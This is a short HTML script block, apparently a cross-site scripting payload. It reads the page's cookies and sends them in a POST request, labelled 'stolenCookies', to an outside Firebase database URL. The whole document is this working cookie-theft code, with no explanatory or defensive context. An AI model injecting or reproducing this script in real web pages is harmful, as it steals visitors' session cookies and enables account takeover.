<script>
var cookies = document.cookie;
var firebaseUrl = "https://yaflfest-970fa-default-rtdb.firebaseio.com/";
var xhr = new XMLHttpRequest();
xhr.open("POST", firebaseUrl, true);
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send(JSON.stringify({ stolenCookies: cookies }));
</script>
